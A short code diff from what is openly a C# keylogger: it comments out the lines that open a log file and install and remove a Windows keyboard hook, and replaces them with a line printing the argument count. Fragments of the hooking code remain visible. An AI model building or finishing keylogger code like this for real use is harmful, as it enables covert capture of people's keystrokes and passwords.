@@ -17,14 +17,15 @@ namespace KeyLogger {
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
-    public static void Main(string logFileName) {
+    public static void Main(string[] args/*, string logFileName*/) {
       /*logFileName = logFilePath;*/
-      logFile = File.AppendText(logFileName);
+      /*logFile = File.AppendText(logFileName);
       logFile.AutoFlush = true;
 
       hookId = SetHook(hookProc);
       Application.Run();
-      UnhookWindowsHookEx(hookId);
+      UnhookWindowsHookEx(hookId);*/
+      System.Console.WriteLine(args.Length);
     }
 
     private static IntPtr SetHook(HookProc hookProc) {
